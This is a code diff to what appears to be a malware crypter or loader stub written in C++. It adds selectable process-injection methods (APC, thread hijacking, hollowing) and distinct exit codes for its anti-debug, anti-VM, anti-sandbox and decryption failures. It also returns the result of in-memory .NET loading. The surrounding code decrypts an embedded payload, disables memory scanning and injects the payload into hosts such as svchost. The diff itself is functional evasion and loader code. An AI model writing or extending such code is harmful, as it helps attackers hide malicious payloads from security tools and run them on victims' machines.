@@ -94,7 +94,8 @@ struct StubConfig {
     unsigned char encAlgorithm;       // 0=AES,1=ChaCha,2=RC4,3=XOR
     unsigned char researchPackage;    // 0=None,1=Ghost,2=Neuro,3=Darknet
     unsigned char hostProcess;        // 0=notepad,1=svchost,2=rundll32,3=installutil
-    char pad[4];                      // Alignment to 44 bytes total
+    unsigned char injectionMethod;   // 0=SectionMap,1=APC,2=ThreadHijack,3=HollowPlus,4=CallbackEnum
+    char pad[3];                      // Alignment to 44 bytes total
 };
 
 static_assert(sizeof(StubConfig) == 44, "StubConfig must be 44 bytes");
@@ -212,7 +213,7 @@ int PayloadMain(void* hInstance)
 
     // ── Step 0: Anti-Tamper (Always Active) ──
     if (!Protection::VerifyIntegrity()) {
-        return 0;
+        return 100;
     }
     JUNK_CODE();
 
@@ -257,15 +258,15 @@ int PayloadMain(void* hInstance)
     // ── Step 3: Anti-Analysis ──
     if (GlobalConfig.bAntiDebug) {
         if (Evasion::AntiDebug::Check())
-            return 0;
+            return 101;
     }
     if (GlobalConfig.bAntiVM) {
         if (Evasion::AntiVM::Check())
-            return 0;
+            return 102;
     }
     if (GlobalConfig.bAntiSandbox) {
         if (Evasion::AntiSandbox::Check())
-            return 0;
+            return 103;
     }
     JUNK_CODE();
 
@@ -315,7 +316,7 @@ int PayloadMain(void* hInstance)
     DWORD decryptSize = PayloadData.size;
 
     if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data))
-        return 0;
+        return 104;
     JUNK_CODE();
 
     if (GlobalConfig.bEntropyNorm && PayloadData.size > 1 && PayloadData.data[0] == 0xEE) {
@@ -348,16 +349,16 @@ int PayloadMain(void* hInstance)
             case 4: resOk = VoidDecrypt::Decrypt(PayloadData.data, decryptSize,
                 finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
         }
-        if (!resOk) return 0;
+        if (!resOk) return 105;
     }
     else {
         Crypto::Algorithm algo = static_cast<Crypto::Algorithm>(GlobalConfig.encAlgorithm);
         if (GlobalConfig.bStagedLoad) {
             if (!StageLoader::DecryptStaged(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo))
-                return 0;
+                return 106;
         } else {
             if (!Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo))
-                return 0;
+                return 107;
         }
     }
 
@@ -393,15 +394,23 @@ int PayloadMain(void* hInstance)
     }
 
     // ── Step 9: Execute Payload ──
-    if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
-        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
-        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        DotNetLoader::LoadAndExecute(PayloadData.data, decryptSize);
+    if (GlobalConfig.bDotNetLoading) {
+        if (DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
+            if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+            else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+            int dotNetResult = DotNetLoader::LoadAndExecute(PayloadData.data, decryptSize);
+            // Return .NET method's return value as exit code
+            // -1=payload null, -2=not .NET, -3=CLR init fail,
+            // -4=temp path fail, -5=write fail, -6=ExecuteInDefaultAppDomain fail
+            // Positive value = .NET method's return value (42 from E2EMarker.Run)
+            return dotNetResult;
+        }
+        return 111;  // IsDotNetAssembly returned false
     }
     else if (GlobalConfig.bRemoteInjection) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        Injection::Execute(PayloadData.data, decryptSize, 0);
+        Injection::Execute(PayloadData.data, decryptSize, GlobalConfig.injectionMethod);
     }
     else if (GlobalConfig.bPhantomDLL) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
